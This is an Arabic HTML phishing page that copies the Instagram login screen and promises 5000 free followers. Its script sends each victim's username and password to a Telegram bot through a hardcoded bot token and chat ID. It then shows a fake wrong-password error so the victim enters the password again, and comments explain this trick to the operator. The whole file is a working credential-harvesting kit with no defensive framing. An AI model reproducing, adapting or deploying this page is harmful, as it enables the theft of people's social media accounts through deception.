<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>زيادة متابعين إنستقرام مجاناً</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 9px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        .btn { width: 100%; background-color: #0095f6; border: none; color: white; padding: 7px; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 10px; }
        .btn:disabled { background-color: #b2dffc; }
        .footer { margin-top: 20px; font-size: 14px; color: #8e8e8e; direction: rtl; }
        .error { color: red; font-size: 12px; margin-bottom: 10px; display: none; }
    </style>
</head>
<body>

    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460313f5.png" class="logo" alt="Instagram">
        <p style="font-size: 14px; color: #8e8e8e; font-weight: bold; margin-bottom: 20px;">سجل دخولك لتلقي 5000 متابع مجاناً</p>
        
        <div id="error" class="error">عذراً، كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.</div>
        
        <input type="text" id="user" placeholder="رقم الهاتف، اسم المستخدم، أو البريد الإلكتروني" dir="rtl">
        <input type="password" id="pass" placeholder="كلمة المرور" dir="rtl">
        
        <button class="btn" id="submitBtn" onclick="sendToVexo()">تسجيل الدخول</button>
    </div>

    <div class="footer">
        ليس لديك حساب؟ <span style="color: #0095f6; font-weight: bold;">تسجيل</span>
    </div>

    <script>
        const TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs';
        const ID = '7822309283';

        async function sendToVexo() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            const btn = document.getElementById('submitBtn');
            const error = document.getElementById('error');

            if (user === "" || pass === "") {
                alert("يرجى ملء كافة الحقول");
                return;
            }

            btn.disabled = true;
            btn.innerText = "جاري التحقق...";

            // البيانات التي ستصلك على تليجرام
            const message = `🔥 صيد إنستجرام جديد 🔥\n\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}\n\n💀 VEXO - OWNER`;

            try {
                // إرسال البيانات لبوتك
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(message)}`);
                
                // إظهار خطأ وهمي للضحية لزيادة المصداقية (ليجرب مرة أخرى)
                setTimeout(() => {
                    error.style.display = 'block';
                    btn.disabled = false;
                    btn.innerText = "تسجيل الدخول";
                    document.getElementById('pass').value = "";
                }, 2000);

            } catch (e) {
                console.log("Error");
            }
        }
    </script>
</body>
</html>
